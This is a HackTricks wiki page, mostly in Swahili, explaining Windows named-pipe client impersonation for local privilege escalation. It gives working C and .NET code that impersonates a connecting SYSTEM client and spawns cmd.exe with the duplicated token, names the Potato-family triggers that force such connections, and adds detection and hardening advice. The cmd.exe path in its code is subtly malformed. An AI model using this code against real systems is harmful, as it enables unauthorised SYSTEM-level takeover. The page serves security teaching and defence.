# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ni primitive ya local privilege escalation inayoruhusu thread ya server ya named-pipe kuchukua muktadha wa usalama wa mteja anayounganisha nayo. Kwa vitendo, mwasi ambaye anaweza kuendesha msimbo akiwa na SeImpersonatePrivilege anaweza kuwalazimisha mteja mwenye heshima (kwa mfano, SYSTEM service) kuungana na pipe inayoendeshwa na mwasi, kuita ImpersonateNamedPipeClient, kunakili token iliyopatikana kuwa primary token, na kuanzisha mchakato kama mteja (mara nyingi NT AUTHORITY\SYSTEM).

Ukurasa huu unalenga mbinu kuu. Kwa chains za exploit kutoka mwanzo mpaka mwisho zinazomfanya SYSTEM kuungana na pipe yako, ona kurasa za familia ya Potato zilizotajwa hapa chini.

## Muhtasari (TL;DR)
- Tengeneza named pipe: \\.\pipe\<random> na subiri muunganisho.
- Fanya sehemu yenye heshima iungane nayo (spooler/DCOM/EFSRPC/etc.).
- Soma angalau ujumbe mmoja kutoka kwa pipe, kisha ita ImpersonateNamedPipeClient.
- Fungua impersonation token kutoka kwa thread ya sasa, DuplicateTokenEx(TokenPrimary), na CreateProcessWithTokenW/CreateProcessAsUser kupata mchakato wa SYSTEM.

## Mahitaji na APIs muhimu
- Ruhusa zinazohitajika kawaida na process/thread inayoiita:
- SeImpersonatePrivilege ili kufanikiwa kujifanya mteja anayounganisha na kutumia CreateProcessWithTokenW.
- Vinginevyo, baada ya kujifanya SYSTEM, unaweza kutumia CreateProcessAsUser, ambayo inaweza kuhitaji SeAssignPrimaryTokenPrivilege na SeIncreaseQuotaPrivilege (hizi zinatimizwa unapokuwa unajifanya SYSTEM).
- APIs kuu zinazotumika:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (inabidi usome angalau ujumbe mmoja kabla ya kujifanya)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Kiwango cha impersonation: ili kufanya vitendo vinavyofaa kwa lokali, mteja lazima aruhusu SecurityImpersonation (chaguo-msingi kwa RPC/named-pipe clients wengi). Wateja wanaweza kupunguza hili kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wakati wa kufungua pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Iwapo ImpersonateNamedPipeClient itarudisha ERROR_CANNOT_IMPERSONATE (1368), hakikisha unasoma kwanza kutoka kwenye pipe na kwamba client hakuzuia impersonation kwa Identification level.
- Pendelea DuplicateTokenEx pamoja na SecurityImpersonation na TokenPrimary ili kuunda primary token inayofaa kwa process creation.

## .NET mfano mfupi
Katika .NET, NamedPipeServerStream inaweza impersonate kupitia RunAsClient. Ukishaanza impersonate, duplicate thread token kisha unda mchakato.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Vichocheo/vitalamisho vya kawaida vya kumfanya SYSTEM kuungane na pipe yako
Mbinu hizi hulazimisha huduma zenye vibali kuungana na named pipe yako ili uweze kujifanya kuwa wao:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Utatuzi wa matatizo na mambo ya tahadhari
- Lazima usome angalau ujumbe mmoja kutoka kwenye pipe kabla ya kuita ImpersonateNamedPipeClient; vinginevyo utapata ERROR_CANNOT_IMPERSONATE (1368).
- Iwapo client itaungana kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server haiwezi kujifanya kwa ukamilifu; angalia kiwango cha impersonation cha token kupitia GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW inahitaji SeImpersonatePrivilege kwenye anayeita. Ikiwa hilo linashindwa kwa ERROR_PRIVILEGE_NOT_HELD (1314), tumia CreateProcessAsUser baada ya tayari kujifanya kuwa SYSTEM.
- Hakikisha security descriptor ya pipe yako inamruhusu huduma lengwa kuungana ikiwa umeimarisha; kwa kawaida, pipes chini ya \\.\pipe zinapatikana kulingana na DACL ya server.

## Utambuzi na uimarishaji
- Fuatilia uundaji wa named pipe na miunganisho. Sysmon Event IDs 17 (Pipe Created) na 18 (Pipe Connected) ni muhimu kuanzisha orodha ya majina ya pipe halali na kugundua pipes zisizo za kawaida, zinazoonekana nasibu kabla ya matukio ya urekebishaji token.
- Tafuta mfululizo: mchakato unaunda pipe, huduma ya SYSTEM inaungana, kisha mchakato uliounda unazalisha mchakato mtoto kama SYSTEM.
- Punguza uwekaji hatarini kwa kuondoa SeImpersonatePrivilege kutoka kwa akaunti za huduma zisizo za lazima na kuepuka kuingia kwa huduma zisizo za lazima zenye ruhusa za juu.
- Maendeleo ya kujilinda: unapotumia kuungana na named pipes zisizo za kuaminika, bainisha SECURITY_SQOS_PRESENT na SECURITY_IDENTIFICATION ili kuzuia server kujifanya kabisa client isipokuwa inapohitajika.

## Marejeo
- Windows: ImpersonateNamedPipeClient documentation (mahitaji na tabia za impersonation). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (mwongozo na mifano ya code). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
